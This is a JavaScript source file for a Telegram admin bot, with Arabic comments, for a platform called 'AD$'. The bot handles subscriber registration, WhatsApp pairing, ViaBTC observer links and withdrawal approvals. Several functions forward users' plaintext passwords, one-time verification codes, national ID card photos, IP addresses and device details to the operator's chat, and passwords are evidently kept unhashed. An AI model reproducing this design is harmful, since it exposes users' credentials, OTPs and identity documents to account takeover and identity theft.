// telegramBot.js - إدارة بوت التيليجرام مع التفعيل الفوري للمشتركين وربط واتساب
class TelegramBotManager {
    constructor(token, adminChatId, onDecisionCallback) {
        this.token = token;
        this.adminChatId = String(adminChatId);
        this.onDecisionCallback = onDecisionCallback;
        this.apiUrl = `https://api.telegram.org/bot${this.token}`;
        this.lastUpdateId = 0;
        this.isPolling = false;
        this.awaitingViaBtcForPhone = null;
    }

    startListening() {
        if (!this.token || this.token.includes("ضع_توكن") || this.isPolling) return;
        this.isPolling = true;
        console.log("✅ بوت التيليجرام متصل وجاهز لاستقبال الأوامر...");
        this.registerBotCommands();
        this.pollUpdates();
    }

    async registerBotCommands() {
        try {
            await fetch(`${this.apiUrl}/setMyCommands`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    commands: [
                        { command: "menu", description: "📊 لوحة التحكم والإحصائيات" },
                        { command: "users", description: "👥 عرض قائمة المشتركين" },
                        { command: "clear", description: "🗑️ مسح قوائم السحوبات" }
                    ]
                })
            });
        } catch (e) {}
    }

    async pollUpdates() {
        while (this.isPolling) {
            try {
                const res = await fetch(`${this.apiUrl}/getUpdates?offset=${this.lastUpdateId + 1}&timeout=25`);
                const data = await res.json();

                if (data.ok && Array.isArray(data.result)) {
                    for (const update of data.result) {
                        this.lastUpdateId = update.update_id;

                        if (update.callback_query) {
                            await this.handleButtonClick(update.callback_query);
                        }

                        if (update.message && update.message.text) {
                            await this.handleTextCommand(update.message);
                        }
                    }
                }
            } catch (err) {
                await new Promise(r => setTimeout(r, 3000));
            }
        }
    }

    async handleTextCommand(message) {
        const chatId = String(message.chat.id);
        if (chatId !== this.adminChatId) return;

        const text = message.text.trim();

        if (text === "الغاء" || text === "إلغاء" || text === "/cancel") {
            this.awaitingViaBtcForPhone = null;
            await this.sendPlainMessage("❎ *تم إلغاء العملية.*");
            return;
        }

        // 1. أمر ربط واتساب: ربط 010xxxxxxxx
        if (text.startsWith("ربط ") || text.startsWith("/pair ")) {
            const phone = text.replace(/^(\/pair|ربط)\s+/i, "").trim();
            await this.sendPlainMessage(`⏳ *جاري توليد كود ربط الواتساب للرقم* \`${phone}\` *... انتظر لحظات.*`);
            const res = await this.onDecisionCallback(phone, "pair_whatsapp");
            if (!res?.success) {
                await this.sendPlainMessage(`⚠️ ${res?.message || "تعذر طلب كود الربط."}`);
            }
            return;
        }

        // 2. استقبال رابط ViaBTC لتفعيل المشترك
        if (this.awaitingViaBtcForPhone && text.startsWith("http")) {
            const targetPhone = this.awaitingViaBtcForPhone;
            this.awaitingViaBtcForPhone = null;

            const result = await this.onDecisionCallback(targetPhone, "activate_user_url", text);
            if (result && result.success) {
                await this.sendPlainMessage(
`✅ *تم تفعيل حساب المشترك فوراً وإشعاره تلقائياً عبر واتساب!*
👤 *الاسم:* ${result.user.name} | 📱 *الهاتف:* \`${result.user.phone}\`
🔑 *الباسورد:* \`${result.user.password}\` | 🔗 *الرابط:* \`${result.user.viabtcUrl}\``
                );
            } else {
                await this.sendPlainMessage(`⚠️ تعذر التفعيل: ${result?.message || "المشترك غير موجود"}`);
            }
            return;
        }

        // 3. تفعيل مباشر: تفعيل 010xxxxxxxx رابط
        if (text.startsWith("/activate ") || text.startsWith("تفعيل ")) {
            const parts = text.replace(/^(\/activate|تفعيل)\s+/i, "").trim().split(/\s+/);
            const phone = parts[0];
            const url = parts[1] || "";

            if (!/^01[0-9]{9}$/.test(phone)) {
                await this.sendPlainMessage("⚠️ *الصيغة الصحيحة:*\n`تفعيل 01012345678 https://www.viabtc.com/...`");
                return;
            }

            const result = await this.onDecisionCallback(phone, "activate_user_url", url);
            if (result && result.success) {
                await this.sendPlainMessage(`✅ *تم تفعيل المشترك (${result.user.name}) وإرسال إشعار واتساب له!*`);
            } else {
                await this.sendPlainMessage(`⚠️ ${result?.message || "لم يتم العثور على طلب تسجيل لهذا الرقم."}`);
            }
            return;
        }

        // 4. إضافة مشترك يدوياً: اضافة الاسم|الرقم|الباسورد|الرابط
        if (text.startsWith("/adduser ") || text.startsWith("اضافة ") || text.startsWith("إضافة ")) {
            const rawPayload = text.replace(/^(\/adduser|اضافة|إضافة)\s+/i, "").trim();
            const result = await this.onDecisionCallback("MANUAL", "add_full_user", rawPayload);

            if (result && result.success) {
                await this.sendPlainMessage(`✅ *تمت إضافة وتفعيل المشترك (${result.user.name}) بنجاح!*`);
            } else {
                await this.sendPlainMessage("⚠️ *الصيغة:*\n`اضافة الاسم|01012345678|الباسورد|الرابط`");
            }
            return;
        }

        if (text === "/users" || text === "المشتركين" || text === "الحسابات") {
            const info = await this.onDecisionCallback("ALL", "list_users");
            await this.sendPlainMessage(info?.formattedText || "لا توجد حسابات مسجلة حالياً.");
            return;
        }

        if (text === "/clear" || text === "مسح" || text === "مسح القائمة") {
            await this.onDecisionCallback("ALL", "clear_all");
            await this.sendPlainMessage("✅ *تم مسح قوائم السحوبات وتصفير المبالغ المعلقة لجميع الحسابات!*");
            return;
        }

        if (text === "/start" || text === "/menu" || text === "تحكم") {
            const status = await this.onDecisionCallback("ALL", "get_status");
            const panelText =
`🎛 *لوحة التحكم - منصة AD$*
━━━━━━━━━━━━━━━━━━━━
📡 *حالة واتساب السيرفر:* ${status?.waConnected ? "🟢 متصل ويرسل تلقائياً" : "🔴 غير مربوط"}
👥 *المشتركون المفعّلون:* \`${status?.usersCount || 0}\` مشترك
⏳ *طلبات بانتظار التفعيل:* \`${status?.pendingRegCount || 0}\` طلب
🏦 *سعر الصرف الرسمي:* \`${status?.exchangeRate || "56.26"} ج.م\`
━━━━━━━━━━━━━━━━━━━━
📲 *لربط أو إعادة ربط واتساب السيرفر:*
أرسل في المحادثة: \`ربط 010xxxxxxxx\``;

            await fetch(`${this.apiUrl}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: this.adminChatId,
                    text: panelText,
                    parse_mode: "Markdown",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "👥 عرض قائمة المشتركين", callback_data: "list_users:panel" }],
                            [{ text: "🗑️ مسح جميع قوائم السحوبات", callback_data: "clear_all:panel" }]
                        ]
                    }
                })
            });
        }
    }

    async sendPlainMessage(text, replyMarkup = null) {
        try {
            const body = { chat_id: this.adminChatId, text: text, parse_mode: "Markdown" };
            if (replyMarkup) body.reply_markup = replyMarkup;
            await fetch(`${this.apiUrl}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(body)
            });
        } catch (e) {}
    }

    async sendOtpAlertToAdmin(phone, otpCode, purpose, autoSent) {
        const purposeText = purpose === "register" ? "تسجيل حساب جديد" : "استعادة كلمة المرور";
        const msg =
`🔐 *إشعار مصادقة واتساب التلقائية (OTP)*
━━━━━━━━━━━━━━━━━━━━
📌 *العملية:* ${purposeText}
📱 *هاتف المشترك:* \`${phone}\`
🔢 *الكود المرسل (7 أرقام):* \`${otpCode}\`
📡 *حالة الإرسال:* ${autoSent ? "✅ تم الإرسال تلقائياً إلى واتساب المشترك" : "⚠️ لم يُرسل لأن واتساب السيرفر غير مربوط (أرسل: ربط 010xxxxxxxx)"}
━━━━━━━━━━━━━━━━━━━━`;
        await this.sendPlainMessage(msg);
    }

    async sendNewRegistrationWithIdCard(regData) {
        const { fullName, phone, password, idCardBase64, deviceInfo, date } = regData;
        const caption =
`🆕 *طلب تسجيل مشترك جديد + صورة البطاقة*
━━━━━━━━━━━━━━━━━━━━
👤 *الاسم الكامل:* ${fullName}
📱 *رقم الهاتف:* \`${phone}\`
🔑 *كلمة المرور:* \`${password}\`
📲 *الجهاز:* ${deviceInfo?.deviceModel || "غير معروف"}
🌐 *الـ IP:* ${deviceInfo?.ip || "غير معروف"}
⏰ *التوقيت:* ${date}
━━━━━━━━━━━━━━━━━━━━
👇 *اضغط لتفعيل الحساب فوراً:*`;

        const inlineKeyboard = {
            inline_keyboard: [
                [{ text: "⚡ تفعيل فوري وربط رابط ViaBTC مخصص", callback_data: `prompt_activate:${phone}` }],
                [{ text: "✅ تفعيل فوري بالرابط الافتراضي", callback_data: `quick_activate:${phone}` }]
            ]
        };

        try {
            if (idCardBase64 && idCardBase64.includes("base64,")) {
                const base64Data = idCardBase64.split("base64,")[1];
                const buffer = Buffer.from(base64Data, "base64");
                const formData = new FormData();
                formData.append("chat_id", this.adminChatId);
                formData.append("caption", caption);
                formData.append("parse_mode", "Markdown");
                formData.append("reply_markup", JSON.stringify(inlineKeyboard));
                formData.append("photo", new Blob([buffer], { type: "image/jpeg" }), `id_${phone}.jpg`);

                await fetch(`${this.apiUrl}/sendPhoto`, { method: "POST", body: formData });
            } else {
                await this.sendPlainMessage(caption, inlineKeyboard);
            }
        } catch (err) {
            await this.sendPlainMessage(caption, inlineKeyboard);
        }
    }

    async sendPasswordResetNotice(user) {
        const text = `🔄 *قام المشترك ${user.name} (\`${user.phone}\`) بتحديث كلمة المرور عبر كود واتساب التلقائي*\n🔑 *الجديدة:* \`${user.password}\``;
        await this.sendPlainMessage(text);
    }

    async sendWithdrawNotification(record, totalPending) {
        if (!this.token || this.token.includes("ضع_توكن")) return;

        const rawDestination = String(record.destination || "").trim();
        const cleanCopyableNumber = rawDestination.replace(/\s+/g, "");
        const dev = record.deviceInfo || {};

        const text = 
`🔔 *طلب سحب جديد | حساب: ${record.accountOwnerName}*
━━━━━━━━━━━━━━━━━━━━
🆔 *رقم العملية:* \`${record.id}\`
📱 *حساب المشترك:* \`${record.userPhone}\` (${record.accountOwnerName})
👤 *اسم المستفيد:* ${record.userName}
💰 *المبلغ المخصوم:* $${record.gross}
📉 *رسوم التحويل (25%):* -$${record.fee}
💵 *الصافي بالدولار:* $${record.net}
🏦 *سعر الصرف الرسمي:* ${record.exchangeRate} ج.م
🇪🇬 *المبلغ المطلوب بالمصري:* *${Number(record.netEgp).toLocaleString("en-US", { minimumFractionDigits: 2 })} ج.م*
━━━━━━━━━━━━━━━━━━━━
💳 *وسيلة الدفع:* ${record.method}
📋 *اضغط لنسخ الرقم:* \`${cleanCopyableNumber}\`
${rawDestination !== cleanCopyableNumber ? `🔢 *التنسيق:* \`${rawDestination}\`\n` : ""}━━━━━━━━━━━━━━━━━━━━
📱 *الجهاز:* ${dev.deviceModel || "غير معروف"} | 🌐 *الـ IP:* \`${dev.ip || "غير معروف"}\`
📊 *المعلق بحساب المشترك:* $${totalPending.toFixed(2)}
⏰ *التوقيت:* ${record.date}`;

        const inlineKeyboard = {
            inline_keyboard: [
                [{ text: "✅ تمت التسوية والدفع بنجاح", callback_data: `approve:${record.userPhone}:${record.id}` }],
                [{ text: "❌ فشلت العملية (إعادة المبلغ)", callback_data: `reject:${record.userPhone}:${record.id}` }],
                [{ text: "🗑️ مسح سجل هذا المشترك", callback_data: `clear_user:${record.userPhone}:${record.id}` }]
            ]
        };

        try {
            await fetch(`${this.apiUrl}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: this.adminChatId, text: text, parse_mode: "Markdown", reply_markup: inlineKeyboard })
            });
        } catch (err) {}
    }

    async handleButtonClick(callbackQuery) {
        const chatId = String(callbackQuery.message?.chat?.id || "");
        if (chatId !== this.adminChatId) return;

        const data = callbackQuery.data || "";
        const parts = data.split(":");
        const action = parts[0];
        const targetPhone = parts[1];
        const txId = parts[2];
        const message = callbackQuery.message;

        if (action === "prompt_activate") {
            this.awaitingViaBtcForPhone = targetPhone;
            await this.answerCallback(callbackQuery.id, "أرسل الآن رابط ViaBTC في المحادثة");
            await this.sendPlainMessage(`🔗 *أرسل الآن رابط المراقب (ViaBTC Observer URL) الخاص بالمشترك* \`${targetPhone}\` *في رسالة عادية:*`);
            return;
        }

        if (action === "quick_activate") {
            const result = await this.onDecisionCallback(targetPhone, "activate_user_url", "");
            if (result && result.success) {
                await this.answerCallback(callbackQuery.id, "✅ تم تفعيل حساب المشترك فوراً!");
                await this.sendPlainMessage(`✅ *تم تفعيل حساب المشترك (${result.user.name} - \`${result.user.phone}\`) وإشعاره على واتساب!*`);
            } else {
                await this.answerCallback(callbackQuery.id, `⚠️ ${result?.message || "تعذر التفعيل"}`);
            }
            return;
        }

        if (action === "list_users") {
            const info = await this.onDecisionCallback("ALL", "list_users");
            await this.answerCallback(callbackQuery.id, "تم جلب القائمة");
            await this.sendPlainMessage(info?.formattedText || "لا توجد حسابات حالياً.");
            return;
        }

        if (action === "clear_all") {
            await this.onDecisionCallback("ALL", "clear_all");
            await this.answerCallback(callbackQuery.id, "✅ تم مسح جميع قوائم السحوبات!");
            return;
        }

        if (action === "clear_user") {
            await this.onDecisionCallback(targetPhone, "clear_user");
            await this.answerCallback(callbackQuery.id, `✅ تم مسح سحوبات المشترك ${targetPhone}`);
            return;
        }

        const updatedRecord = await this.onDecisionCallback(targetPhone, action, txId);
        if (!updatedRecord) {
            await this.answerCallback(callbackQuery.id, "⚠️ العملية غير موجودة أو تم مسحها.");
            return;
        }

        const statusLine = action === "approve"
            ? "✅ *الحالة النهائية: تمت التسوية والدفع بنجاح*"
            : "❌ *الحالة النهائية: فشلت العملية (تم إرجاع المبلغ)*";

        const updatedText = `${message.text}\n\n${statusLine}`;
        await fetch(`${this.apiUrl}/editMessageText`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: message.chat.id, message_id: message.message_id, text: updatedText, parse_mode: "Markdown" })
        });

        await this.answerCallback(callbackQuery.id, action === "approve" ? "تم اعتماد الدفع!" : "تم إلغاء العملية!");
    }

    async answerCallback(callbackQueryId, text) {
        await fetch(`${this.apiUrl}/answerCallbackQuery`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ callback_query_id: callbackQueryId, text: text, show_alert: true })
        });
    }
}

module.exports = TelegramBotManager;
